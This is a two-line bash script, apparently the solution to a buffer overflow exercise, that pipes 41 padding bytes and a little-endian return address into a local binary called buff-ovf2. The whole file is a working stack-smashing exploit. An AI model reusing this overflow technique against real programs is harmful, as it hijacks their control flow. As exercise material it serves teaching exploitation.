#!/bin/bash

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*41 + b"\xed\x85\x04\x08")' | ./buff-ovf2
